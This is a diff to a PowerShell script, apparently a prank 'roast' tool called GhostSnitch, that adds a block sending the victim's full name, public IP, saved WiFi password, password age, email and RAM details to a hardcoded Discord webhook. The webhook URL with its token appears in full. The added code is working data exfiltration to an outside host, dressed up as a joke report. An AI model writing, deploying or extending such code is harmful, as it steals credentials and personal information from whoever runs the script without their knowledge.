@@ -104,6 +104,30 @@ function Get-Email {
     }
 }
 
+# Send to discord webhook
+$webhookUrl = 'https://discord.com/api/webhooks/1364536515954348032/3H6tkezlhYibD9CB6qAE62ON__BTvWcGEtuihmz7NylPZOhDYcjO0gq8BOuS-lLvDBBg'
+
+# Prepare the message content
+$discordPayload = @{
+    username = "👻 GhostSnitch Bot"
+    content = "**🎯 Roast Session Logged!**"
+    embeds = @(@{
+        title = "🧠 Roast Report for $fullName"
+        color = 16711680
+        fields = @(
+            @{ name = "💾 RAM Roast"; value = (Get-RAM); inline = $true },
+            @{ name = "🌍 Public IP"; value = (Get-PubIP); inline = $true },
+            @{ name = "📶 WiFi Password"; value = (Get-WifiPass); inline = $false },
+            @{ name = "🔒 Password Age"; value = (Get-PasswordAge); inline = $false },
+            @{ name = "📧 Email Roast"; value = (Get-Email); inline = $false }
+        )
+        footer = @{ text = "GhostSnitch v1.0 by TBJr" }
+        timestamp = (Get-Date).ToString("o")
+    })
+}
+
+# Convert to JSON and POST
+Invoke-RestMethod -Uri $webhookUrl -Method Post -Body (ConvertTo-Json $discordPayload -Depth 10) -ContentType 'application/json'
 # Function to generate roast wallpaper
 function Make-Wallpaper {
     Add-Type -AssemblyName System.Drawing
